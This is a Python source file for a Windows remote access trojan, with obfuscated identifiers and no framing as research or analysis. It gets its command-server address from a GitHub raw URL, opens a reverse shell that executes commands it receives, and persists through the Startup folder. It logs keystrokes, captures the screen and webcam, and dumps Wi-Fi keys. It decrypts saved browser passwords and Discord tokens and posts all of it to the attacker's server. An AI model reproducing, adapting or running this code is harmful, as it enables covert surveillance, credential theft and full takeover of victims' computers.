import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
sJkDcNzYFnvlCB = ""
HJlSLrRigGjJEGdQIuw = ""
pXGIDGzXeRgHzloNJi = "16.03.25.2"
uhJWRmRmpQCvTc = True
AKjOGqjVUkOmcccUjrLw = "!"
XaUAhaSPIENWlkAGUUC = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
gAIomGs = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
JcnlUWEAlwfZCPmzCRTtrs = os.path.expanduser("~\\AppData\\Local\\")
PDzpYGklbISCOhQMLrcvrG = os.path.expanduser("~\\AppData\\Roaming\\")
InZpTbGEX = ""
FvhEtWbSxiECUUSicmpjBop = {
	'chrome':JcnlUWEAlwfZCPmzCRTtrs+'Google\\Chrome\\User Data','chromium':JcnlUWEAlwfZCPmzCRTtrs+'Chromium\\User Data','chrome-canary':JcnlUWEAlwfZCPmzCRTtrs+'Google\\Chrome SxS\\User Data',
	'msedge':JcnlUWEAlwfZCPmzCRTtrs+'Microsoft\\Edge\\User Data','msedge-canary':JcnlUWEAlwfZCPmzCRTtrs+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':JcnlUWEAlwfZCPmzCRTtrs+'Microsoft\\Edge Beta\\User Data','msedge-dev':JcnlUWEAlwfZCPmzCRTtrs+'Microsoft\\Edge Dev\\User Data',
	'avast':JcnlUWEAlwfZCPmzCRTtrs+'AVAST Software\\Browser\\User Data','amigo':JcnlUWEAlwfZCPmzCRTtrs+'Amigo\\User Data',
	'torch':JcnlUWEAlwfZCPmzCRTtrs+'Torch\\User Data','kometa':JcnlUWEAlwfZCPmzCRTtrs+'Kometa\\User Data','orbitum':JcnlUWEAlwfZCPmzCRTtrs+'Orbitum\\User Data',
	'cent-browser':JcnlUWEAlwfZCPmzCRTtrs+'CentBrowser\\User Data','7star':JcnlUWEAlwfZCPmzCRTtrs+'7Star\\7Star\\User Data',
	'sputnik':JcnlUWEAlwfZCPmzCRTtrs+'Sputnik\\Sputnik\\User Data','vivaldi':JcnlUWEAlwfZCPmzCRTtrs+'Vivaldi\\User Data',
	'epic-privacy-browser':JcnlUWEAlwfZCPmzCRTtrs+'Epic Privacy Browser\\User Data','uran':JcnlUWEAlwfZCPmzCRTtrs+'uCozMedia\\Uran\\User Data',
	'yandex':JcnlUWEAlwfZCPmzCRTtrs+'Yandex\\YandexBrowser\\User Data','brave':JcnlUWEAlwfZCPmzCRTtrs+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':JcnlUWEAlwfZCPmzCRTtrs+'Iridium\\User Data','coccoc':JcnlUWEAlwfZCPmzCRTtrs+'CocCoc\\Browser\\User Data',
	'opera':PDzpYGklbISCOhQMLrcvrG+'Opera Software\\Opera Stable','opera-gx':PDzpYGklbISCOhQMLrcvrG+'Opera Software\\Opera GX Stable'
}
def LjzreUADJfHuLPWVCfaGfiP(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def sfnWrsBkSYzjLcghvCOcDz(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	eQPGOqbrPNJPyWBf = data.decode("utf-8").replace("\n","")
	if not eQPGOqbrPNJPyWBf.startswith(AKjOGqjVUkOmcccUjrLw):
		proc = subprocess.run(eQPGOqbrPNJPyWBf, shell=True, capture_output=True)
		DrlKXInT = proc.stdout + proc.stderr
		MHDZxoWcGyB(s, DrlKXInT)
		return
	EpTxoaHrdZrebp = eQPGOqbrPNJPyWBf.split(" ")[0][1:]
	args = " ".join(eQPGOqbrPNJPyWBf.split()[1:]).split()
	if EpTxoaHrdZrebp == "download":
		RQepxvOSMeBrl(s, eQPGOqbrPNJPyWBf)
	elif EpTxoaHrdZrebp == "screenshot":
		kQyoRlrUrZMRfxPB(s)
	elif EpTxoaHrdZrebp == "basename":
		MHDZxoWcGyB(s, os.path.basename(__file__))
	elif EpTxoaHrdZrebp == "update":
		ZWNxBZjXJiuIq(s)
	elif EpTxoaHrdZrebp == "wifi":
		HFjYZNzDNiOS(s)
	elif EpTxoaHrdZrebp == "screenrecord":
		AwIWTheFeGxchVaBAUvcaQ(s, args)
	elif EpTxoaHrdZrebp == "browsers":
		XlmpTZorBuIaoflbrVGmlUV(s)
	elif EpTxoaHrdZrebp == "webcam":
		webCam(s, args)
	elif EpTxoaHrdZrebp == "cd":
		moveDirectory(s, eQPGOqbrPNJPyWBf[4:])
	else:
		MHDZxoWcGyB(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		MHDZxoWcGyB(s,"")
	except:
		MHDZxoWcGyB(s, "[!] 404")
def RQepxvOSMeBrl(s, eQPGOqbrPNJPyWBf):
	hrUWthSntW = eQPGOqbrPNJPyWBf.replace(AKjOGqjVUkOmcccUjrLw+"download ","").split(",")
	DrlKXInTs = ""
	for f in hrUWthSntW:
		DrlKXInTs += mZvUGrpKEUWjYz(f, "api/file/", { "type":os.path.splitext(f)[1] })
	MHDZxoWcGyB(s, DrlKXInTs)
def kQyoRlrUrZMRfxPB(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	GOSoHUan = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(GOSoHUan)
	image.close()
	DrlKXInT = mZvUGrpKEUWjYz(GOSoHUan, "api/sscap")
	os.remove(GOSoHUan)
	MHDZxoWcGyB(s, DrlKXInT)
def webCam(s, args):
	import imageio
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(JcnlUWEAlwfZCPmzCRTtrs+"wc.jpg", camera.get_data(0))
		camera.close()
		r=mZvUGrpKEUWjYz(JcnlUWEAlwfZCPmzCRTtrs+"wc.jpg","api/wc")
		MHDZxoWcGyB(s, r)
	except:
		MHDZxoWcGyB(s, "[!] 404")
def AwIWTheFeGxchVaBAUvcaQ(s, args):
	import imageio
	from PIL import ImageGrab
	jCOHCLABvavfsLmnyFaf = 15
	if not args == []:
		try: jCOHCLABvavfsLmnyFaf = int(args[0])
		except: pass
	LljJbASoAdmfRwf = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	hpBTkPSjZJyWTE = []
	fps = 11
	numFrames = jCOHCLABvavfsLmnyFaf * fps
	for _ in range(numFrames):
		hpBTkPSjZJyWTE.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(LljJbASoAdmfRwf, hpBTkPSjZJyWTE, fps=fps, quality=8)
	r=mZvUGrpKEUWjYz(LljJbASoAdmfRwf, "api/screc")
	os.remove(LljJbASoAdmfRwf)
	MHDZxoWcGyB(s, r)
def mZvUGrpKEUWjYz(BDwXkfE, PpEYyRkHly, jvJkVdc=None):
	import requests
	if not os.path.isfile(BDwXkfE):
		return "[!] 404: "+BDwXkfE+"\n"
	headers = {"user":os.getlogin()}
	if jvJkVdc is not None:
		headers = {**headers, **jvJkVdc}
	f = open(BDwXkfE, "rb")
	requests.post("http://"+sJkDcNzYFnvlCB+":5555/"+PpEYyRkHly,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def wVRltQoiOqGxLZqiymnDldP(cJCSNDmyzohtyXtmw, PpEYyRkHly):
	import requests
	if cJCSNDmyzohtyXtmw.strip() == "":
		return "[!] 204"
	requests.post("http://"+sJkDcNzYFnvlCB+":5555/"+PpEYyRkHly,
		data=cJCSNDmyzohtyXtmw,
		headers={"user":os.getlogin()})
	return "[+] 200"
def ZWNxBZjXJiuIq(s):
	h, p, v = JBbnPORaNpodDF(True)
	if (v != pXGIDGzXeRgHzloNJi):
		zDBvkXrMJyRw(v)
		MHDZxoWcGyB(s, "[+] 200")
	else:
		MHDZxoWcGyB(s, "[-] 304")
def HFjYZNzDNiOS(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		MHDZxoWcGyB(s, "[!] 500")
		return
	AZPwVGrsvifO = ""
	for p in profiles:
		try: AZPwVGrsvifO+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: AZPwVGrsvifO+=f"    {p} - N/A"
	MHDZxoWcGyB(s, AZPwVGrsvifO)
def zDBvkXrMJyRw(bOflMOXbegpfurti):
	import requests
	global uhJWRmRmpQCvTc
	ZqhXBkyTIqp = os.path.basename(__file__)
	fileType = ZqhXBkyTIqp.split(".")[-1]
	SRGvlsIkbfBSmhnFfXjd = ZqhXBkyTIqp.split(".")[0]+"."+bOflMOXbegpfurti+".pyw" if fileType.startswith("py") else ".exe"
	dYrytbbtk = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), SRGvlsIkbfBSmhnFfXjd)
	if not os.path.isfile(dYrytbbtk):
		with open(dYrytbbtk, "w+") as f:
			f.write(requests.get(gAIomGs+"file."+ "pyw" if dYrytbbtk.split(".")[-1].startswith("py") else "exe").text)
	else:
		uhJWRmRmpQCvTc = False
def JBbnPORaNpodDF(force=False):
	global sJkDcNzYFnvlCB, HJlSLrRigGjJEGdQIuw
	if force or sJkDcNzYFnvlCB == "" or HJlSLrRigGjJEGdQIuw == "":
		while True:
			try:
				with urllib.request.urlopen(XaUAhaSPIENWlkAGUUC) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					sJkDcNzYFnvlCB = data[0].strip()
					HJlSLrRigGjJEGdQIuw = data[1].strip()
					bOflMOXbegpfurti = data[2].strip()
					return sJkDcNzYFnvlCB, HJlSLrRigGjJEGdQIuw, bOflMOXbegpfurti
			except:
				time.sleep(10)
def AnldhCEwnMMNHykCPCW():
	try:
		RatciGmhWcWJGfYRCf = "settings.xpb"
		UOFllrsyAWomXEkrps = sorted([file for file in os.listdir(JcnlUWEAlwfZCPmzCRTtrs) if os.path.isfile(JcnlUWEAlwfZCPmzCRTtrs+"\\"+file) and file.endswith(RatciGmhWcWJGfYRCf.split(".")[-1])])
		if RatciGmhWcWJGfYRCf in UOFllrsyAWomXEkrps:
			UOFllrsyAWomXEkrps.remove(RatciGmhWcWJGfYRCf)
		CviQVsiAlbNUAeuDG = os.path.join(JcnlUWEAlwfZCPmzCRTtrs,RatciGmhWcWJGfYRCf)
		if len(UOFllrsyAWomXEkrps) > 0:
			with open(CviQVsiAlbNUAeuDG, "ab+") as f:
				for file in UOFllrsyAWomXEkrps:
					temp = os.path.join(JcnlUWEAlwfZCPmzCRTtrs,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		mZvUGrpKEUWjYz(CviQVsiAlbNUAeuDG, "api/log")
		if os.path.isfile(CviQVsiAlbNUAeuDG):
			os.remove(CviQVsiAlbNUAeuDG)
	except:
		pass
def MCyowhYCJRUWhUNXdYo():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(JcnlUWEAlwfZCPmzCRTtrs+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def KaRjdMWptxZiDeYLLf(k):
		logging.info(str(k))
	k=Listener(on_press=KaRjdMWptxZiDeYLLf)
	kqQlNyaKEBKVp = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in kqQlNyaKEBKVp:
		l.setLevel(logging.CRITICAL)
	k.start()
def XlmpTZorBuIaoflbrVGmlUV(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        dwjrudENrcnIc = "\n"
        for browser in FvhEtWbSxiECUUSicmpjBop:
                path = FvhEtWbSxiECUUSicmpjBop[browser]
                VaACUHHCLdkORUpNj = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        VaACUHHCLdkORUpNj = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", JcnlUWEAlwfZCPmzCRTtrs+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(JcnlUWEAlwfZCPmzCRTtrs+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        dwjrudENrcnIc += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(VaACUHHCLdkORUpNj, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                dwjrudENrcnIc += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(JcnlUWEAlwfZCPmzCRTtrs+"\\db.db")
        doJtAuNxszw = []
        discordPaths = [PDzpYGklbISCOhQMLrcvrG+'\\discord\\Local Storage\\leveldb\\',PDzpYGklbISCOhQMLrcvrG+'\\discordcanary\\Local Storage\\leveldb\\',PDzpYGklbISCOhQMLrcvrG+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                VaACUHHCLdkORUpNj = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        VaACUHHCLdkORUpNj = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(VaACUHHCLdkORUpNj, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in doJtAuNxszw:
                                                doJtAuNxszw.append(decryptedToken)
        PMvDHpHvJdmtu = "https://discord.com/api/v9/users/@me"
        if doJtAuNxszw: dwjrudENrcnIc +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for bruAlerqicuOItSiQOPTCbn in doJtAuNxszw:
                headers = {"Content-Type":"application/json","Authorization":bruAlerqicuOItSiQOPTCbn,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(PMvDHpHvJdmtu, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(PMvDHpHvJdmtu+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(PMvDHpHvJdmtu+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                dwjrudENrcnIc += f"\n{user}\n{'-'*len(user)}\nToken: {bruAlerqicuOItSiQOPTCbn}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        dwjrudENrcnIc += "\n\n"
        if not upload:
                MHDZxoWcGyB(s, dwjrudENrcnIc)
        else:
                wVRltQoiOqGxLZqiymnDldP(dwjrudENrcnIc, "api/google")
def MHDZxoWcGyB(clientSocket, cJCSNDmyzohtyXtmw):
	formattedData = b""
	if type(cJCSNDmyzohtyXtmw) == bytes:
		formattedData += cJCSNDmyzohtyXtmw
	else:
		formattedData += bytes(cJCSNDmyzohtyXtmw, "utf-8")
	formattedData += bytes("\n"+InZpTbGEX+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def zgNsYwibsTMqRxLdekuJcdr():
	global InZpTbGEX
	h, p, v = JBbnPORaNpodDF()
	try: AnldhCEwnMMNHykCPCW()
	except: pass
	try:
		if pXGIDGzXeRgHzloNJi != v:
			zDBvkXrMJyRw(v)
	except: pass
	try:
		if uhJWRmRmpQCvTc:
			XlmpTZorBuIaoflbrVGmlUV(None,True)
	except: pass
	try:
		if uhJWRmRmpQCvTc:
			MCyowhYCJRUWhUNXdYo()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	InZpTbGEX = ("(old)"if pXGIDGzXeRgHzloNJi!=v else "")+"["+pXGIDGzXeRgHzloNJi+"] "+os.getlogin()+" - "
	while True:
		OQGyvgfq=False
		try:
			s=LjzreUADJfHuLPWVCfaGfiP(h, p)
			MHDZxoWcGyB(s, "")
			while not OQGyvgfq:
				try: OQGyvgfq=sfnWrsBkSYzjLcghvCOcDz(s)
				except Exception as e:
					MHDZxoWcGyB(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
zgNsYwibsTMqRxLdekuJcdr()